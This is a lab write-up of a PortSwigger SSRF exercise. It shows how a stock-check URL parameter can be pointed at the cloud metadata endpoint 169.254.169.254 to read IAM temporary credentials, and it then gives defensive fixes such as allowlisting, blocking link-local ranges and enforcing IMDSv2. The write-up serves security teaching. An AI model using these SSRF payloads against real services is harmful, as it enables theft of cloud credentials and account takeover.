# SSRF — reaching cloud metadata

> **Target:** PortSwigger Web Security Academy — *SSRF against another back-end system* (cloud-metadata variant)
> **Class:** `SSRF` · **Difficulty:** ★★★

## Recon

The stock checker sends a server-side request to a URL the client supplies:

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.internal:8080/product/stock/check?productId=1
```

The server fetches `stockApi` and echoes the result. If *we* control that URL, the server makes
requests **on our behalf**, from inside the network.

## The bug

User-controlled URL → server-side fetch, with no allowlist. The app trusts the destination.

## Exploitation

Point it at the cloud instance metadata service (link-local, only reachable from the host):

```http
stockApi=http://169.254.169.254/latest/meta-data/
```

Walk the tree to the IAM role, then read its temporary credentials:

```http
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

The response returns `AccessKeyId` / `SecretAccessKey` / `Token` — live cloud credentials.

> **Real-world nuance:** this is IMDSv1. On IMDSv2 the metadata service requires a `PUT` token first,
> which a naive GET-only SSRF can't obtain — a good reason to enforce IMDSv2 everywhere.

## Impact

Server-side request forgery into the trust boundary → theft of cloud IAM credentials → potential
pivot into the whole account. Also usable for internal port-scanning and hitting admin-only services.

## Fix

- **Allowlist** outbound destinations; resolve + validate the host, block link-local/private ranges
  (`169.254.0.0/16`, `127.0.0.0/8`, RFC1918).
- Re-validate **after** DNS resolution (defeat DNS-rebinding), don't follow redirects blindly.
- Enforce **IMDSv2**; scope IAM roles to least privilege.

## Takeaway

Any "fetch this URL for me" feature is an SSRF candidate. The metadata endpoint is the highest-value
target on cloud hosts — but the fix is boring and absolute: the server, not the user, decides where it
connects.
